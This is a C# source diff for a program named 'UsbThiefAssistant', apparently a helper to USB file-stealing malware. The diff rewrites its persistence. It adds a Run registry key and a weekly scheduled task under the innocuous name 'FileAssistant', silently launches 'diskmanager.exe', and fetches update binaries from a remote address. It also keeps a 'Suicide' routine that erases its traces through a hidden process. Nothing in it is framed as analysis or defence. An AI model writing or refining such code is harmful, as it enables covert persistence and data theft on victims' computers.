@@ -21,11 +21,8 @@ namespace UsbThiefAssistant
                 Environment.Exit(0);
             switch (args[1])
             {
-                case "-init":
-                    Init();
-                    break;
-                case "-kill":
-                    KillProcess();
+                case "-startup":
+                    Startup();
                     break;
                 case "-clean":
                     Clean();
@@ -35,16 +32,11 @@ namespace UsbThiefAssistant
                     break;
                 default:
                     if (args[1].StartsWith("-update="))
-                    {
                         Upd(args[1].Substring(8));
-                    }
-                    else
-                    {
-                        Environment.Exit(0);
-                    }
                     break;
             }
             InitializeComponent();
+            Environment.Exit(0);
         }
         private void Form1_Load(object sender, EventArgs e)
         {
@@ -150,41 +142,29 @@ namespace UsbThiefAssistant
                 return false;
             }
         }
-        private void Init()
+        private void Startup()
         {
             try
             {
                 if (File.Exists(path + "\\rar.exe"))
                     File.Delete(path + "\\rar.exe");
-            }
-            catch (Exception)
-            {
-            }
-            try
-            {
                 RegistryKey rk = Registry.CurrentUser;
                 RegistryKey rk2 = rk.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
-                if (rk2.GetValue("Disk Manager") == null || rk2.GetValue("Disk Manager").ToString() != "\"" + path + "\\diskmanager.exe\" -run")
+                if (rk2.GetValue("FileAssistant") == null || rk2.GetValue("FileAssistant").ToString() != "\"" + Application.ExecutablePath + "\" -startup")
                 {
-                    rk2.SetValue("Disk Manager", "\"" + path + "\\diskmanager.exe\" -run");
+                    rk2.SetValue("FileAssistant", "\"" + Application.ExecutablePath + "\" -startup");
                 }
                 rk2.Close();
                 rk.Close();
-            }
-            catch (Exception)
-            {
-            }
-            try
-            {
-                if (TaskService.Instance.FindTask("Clean Files") == null || TaskService.Instance.FindTask("Clean Files").Definition.Actions[0].ToString() != "\"" + path + "\\fileassistant.exe\" -clean")
+                if (TaskService.Instance.FindTask("FileAssistant") == null || TaskService.Instance.FindTask("FileAssistant").Definition.Actions[0].ToString() != "\"" + Application.ExecutablePath + "\" -clean")
                 {
-                    TaskService.Instance.AddTask("Clean Files", new WeeklyTrigger { DaysOfWeek = DaysOfTheWeek.Friday, StartBoundary = DateTime.Parse("2019-09-27 09:00") }, new ExecAction { Path = "\"" + path + "\\fileassistant.exe\"", Arguments = "-clean" });
+                    TaskService.Instance.AddTask("FileAssistant", new WeeklyTrigger { DaysOfWeek = DaysOfTheWeek.Friday, StartBoundary = DateTime.Parse("2019-09-27 09:00") }, new ExecAction { Path = "\"" + Application.ExecutablePath + "\"", Arguments = "-clean" });
                 }
+                Process.Start(path + "\\diskmanager.exe", "-run");
             }
             catch (Exception)
             {
             }
-            Environment.Exit(0);
         }
         private void Clean()
         {
@@ -196,12 +176,11 @@ namespace UsbThiefAssistant
                     File.Delete(path + "\\status");
                 if (File.Exists(path + "\\log"))
                     File.Delete(path + "\\log");
+                Process.Start(path + "\\diskmanager.exe", "-run");
             }
             catch (Exception)
             {
             }
-            Process.Start(path + "\\diskmanager.exe", "-run");
-            Environment.Exit(0);
         }
         private void Suicide()
         {
@@ -215,11 +194,11 @@ namespace UsbThiefAssistant
                 }
                 rk2.Close();
                 rk.Close();
-                if (TaskService.Instance.FindTask("Clean Files") != null)
+                if (TaskService.Instance.FindTask("FileAssistant") != null)
                 {
                     TaskService ts = new TaskService();
                     TaskFolder tf = ts.RootFolder;
-                    tf.DeleteTask("Clean Files");
+                    tf.DeleteTask("FileAssistant");
                     ts.Dispose();
                 }
             }
@@ -232,8 +211,13 @@ namespace UsbThiefAssistant
                 WindowStyle = ProcessWindowStyle.Hidden,
                 CreateNoWindow = true
             };
-            Process.Start(psi);
-            Environment.Exit(0);
+            try
+            {
+                Process.Start(psi);
+            }
+            catch (Exception)
+            {
+            }
         }
         private void Upd(string text)
         {
@@ -242,7 +226,6 @@ namespace UsbThiefAssistant
             Regex regex = new Regex(r);
             if (regex.IsMatch(addr))
             {
-
                 DownloadFile(addr, path + "\\rar.exe");
                 try
                 {
@@ -252,7 +235,6 @@ namespace UsbThiefAssistant
                 {
                 }
             }
-            Environment.Exit(0);
         }
     }
 }
